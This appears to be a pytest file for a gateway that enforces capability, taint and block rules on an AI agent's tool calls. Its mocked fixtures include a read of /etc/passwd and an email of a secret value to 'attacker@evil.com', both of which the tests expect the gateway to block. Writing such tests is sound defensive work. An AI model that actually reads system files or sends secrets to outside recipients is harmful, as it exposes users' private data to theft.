"""Tests for the live MCP policy gateway shim."""

from __future__ import annotations

from unittest.mock import MagicMock

import pytest

from agent_hardener.shared.schemas import (
    AgentTrajectory,
    CapabilityAnnotations,
    ConfidentialityAnnotations,
    ConfidentialityLevel,
    DeploymentSpec,
    EnforcementAction,
    EnforcementRule,
    GatewayEnforcementSpec,
    PolicyCoverage,
    RedAgentFeedbackSchema,
    SAMOSPolicy,
    SessionTaintRules,
    TaintLevel,
    ToolAnnotation,
    ToolCall,
)
from agent_hardener.verifier import PolicyEnforcingAgentClient


def _policy(
    *,
    tool_name: str = "read_file",
    read_conf: ConfidentialityLevel = ConfidentialityLevel.HIGH,
    write_conf: ConfidentialityLevel = ConfidentialityLevel.HIGH,
    filesystem=False,
    network=False,
    execution=False,
    enforcement_rules=None,
) -> SAMOSPolicy:
    annotation = ToolAnnotation(
        name=tool_name,
        read_confidentiality=read_conf,
        write_confidentiality=write_conf,
        network=network,
        filesystem=filesystem,
        execution=execution,
    )
    return SAMOSPolicy(
        tool_name=tool_name,
        generated_from_attack_cycles=1,
        confidentiality_annotations=ConfidentialityAnnotations(
            read_confidentiality=read_conf,
            write_confidentiality=write_conf,
            read_justification="",
            write_justification="",
        ),
        capability_annotations=CapabilityAnnotations(
            network=network, filesystem=filesystem, execution=execution,
        ),
        session_taint_rules=SessionTaintRules(initial_session_taint=TaintLevel.LOW),
        enforcement_rules=enforcement_rules or [],
        gateway_enforcement=GatewayEnforcementSpec(
            tool_annotation=annotation,
            session_initial_taint=TaintLevel.LOW,
            taint_is_monotonic=True,
            fail_secure_unknown_tools=True,
            policy_log_required=True,
            core_policy_rules=[],
            red_agent_feedback_schema=RedAgentFeedbackSchema(),
        ),
        deployment_spec=DeploymentSpec(isolation_level="separate_container"),
        policy_coverage=PolicyCoverage(),
    )


def _inner_agent(trajectory: AgentTrajectory) -> MagicMock:
    inner = MagicMock()
    inner.run_task.return_value = trajectory
    return inner


class TestCapabilityEnforcement:
    def test_capability_denial_rewrites_call_as_failed(self):
        policy = _policy(filesystem=False)
        inner = _inner_agent(AgentTrajectory(
            prompt="x",
            tool_calls=[ToolCall(tool_name="read_file", parameters={"path": "/etc/passwd"}, success=True, response="root:x:0:0")],
        ))
        gateway = PolicyEnforcingAgentClient(inner, policy)

        result = gateway.run_task("x")
        assert len(result.tool_calls) == 1
        assert result.tool_calls[0].success is False
        assert "filesystem" in result.tool_calls[0].failure_reason
        assert result.refusal_detected is True
        assert any(e["gate"] == "capability" for e in gateway.last_enforcement_log)

    def test_unrestricted_capability_passes_through(self):
        policy = _policy(filesystem=True, read_conf=ConfidentialityLevel.LOW, write_conf=ConfidentialityLevel.LOW)
        inner = _inner_agent(AgentTrajectory(
            prompt="x",
            tool_calls=[ToolCall(tool_name="read_file", parameters={}, success=True, response="ok")],
        ))
        gateway = PolicyEnforcingAgentClient(inner, policy)

        result = gateway.run_task("x")
        assert result.tool_calls[0].success is True
        assert result.refusal_detected is False


class TestTaintEnforcement:
    def test_high_read_then_low_write_is_blocked(self):
        policy = _policy(
            read_conf=ConfidentialityLevel.HIGH,
            write_conf=ConfidentialityLevel.HIGH,
            filesystem=True,
            network=True,
        )
        inner = _inner_agent(AgentTrajectory(
            prompt="x",
            tool_calls=[
                ToolCall(tool_name="read_file", parameters={"path": "/secret"}, success=True, response="ssn=123"),
                ToolCall(tool_name="send_email", parameters={"to": "attacker@evil.com", "body": "ssn=123"}, success=True),
            ],
        ))
        gateway = PolicyEnforcingAgentClient(inner, policy)

        result = gateway.run_task("x")
        assert result.tool_calls[0].success is True  # read passed
        assert result.tool_calls[1].success is False  # exfil blocked
        assert "IFC-001" in result.tool_calls[1].failure_reason
        assert result.refusal_detected is True


class TestEnforcementRuleBlock:
    def test_block_rule_short_circuits_subsequent_calls(self):
        rule = EnforcementRule(
            rule_id="ENF-EXFIL",
            trigger_condition="Block send_email with external recipients",
            action=EnforcementAction.BLOCK,
            reason="exfil guard",
            motivated_by_attack="ATK-001",
        )
        policy = _policy(
            read_conf=ConfidentialityLevel.LOW,
            write_conf=ConfidentialityLevel.LOW,
            filesystem=True,
            network=True,
            enforcement_rules=[rule],
        )
        inner = _inner_agent(AgentTrajectory(
            prompt="x",
            tool_calls=[
                ToolCall(tool_name="read_file", parameters={}, success=True),
                ToolCall(tool_name="send_email", parameters={}, success=True),
                ToolCall(tool_name="read_file", parameters={}, success=True),  # would be dropped
            ],
        ))
        gateway = PolicyEnforcingAgentClient(inner, policy)

        result = gateway.run_task("x")
        # First call passes, second call is rewritten failed, third is dropped.
        assert len(result.tool_calls) == 2
        assert result.tool_calls[0].success is True
        assert result.tool_calls[1].success is False
        assert "ENF-EXFIL" in result.tool_calls[1].failure_reason

    def test_audit_rule_does_not_block(self):
        rule = EnforcementRule(
            rule_id="ENF-AUDIT",
            trigger_condition="Audit calls to read_file",
            action=EnforcementAction.AUDIT,
            reason="logging",
            motivated_by_attack="ATK-001",
        )
        policy = _policy(
            read_conf=ConfidentialityLevel.LOW,
            write_conf=ConfidentialityLevel.LOW,
            filesystem=True,
            enforcement_rules=[rule],
        )
        inner = _inner_agent(AgentTrajectory(
            prompt="x",
            tool_calls=[ToolCall(tool_name="read_file", parameters={}, success=True)],
        ))
        gateway = PolicyEnforcingAgentClient(inner, policy)

        result = gateway.run_task("x")
        assert result.tool_calls[0].success is True
        # Audit fired and was logged.
        assert any(
            e["rule"] == "ENF-AUDIT" and e["action"] == "AUDIT"
            for e in gateway.last_enforcement_log
        )


class TestPassthrough:
    def test_empty_trajectory_passes_through(self):
        policy = _policy()
        inner = _inner_agent(AgentTrajectory(prompt="x", tool_calls=[]))
        gateway = PolicyEnforcingAgentClient(inner, policy)

        result = gateway.run_task("x")
        assert result.tool_calls == []
        assert result.refusal_detected is False

    def test_refusal_from_inner_is_preserved(self):
        policy = _policy()
        inner = _inner_agent(AgentTrajectory(
            prompt="x", tool_calls=[], refusal_detected=True, refusal_message="inner refused",
        ))
        gateway = PolicyEnforcingAgentClient(inner, policy)

        result = gateway.run_task("x")
        assert result.refusal_detected is True
        assert result.refusal_message == "inner refused"

    def test_close_delegates_to_inner(self):
        policy = _policy()
        inner = _inner_agent(AgentTrajectory(prompt="x", tool_calls=[]))
        gateway = PolicyEnforcingAgentClient(inner, policy)
        gateway.close()
        inner.close.assert_called_once()
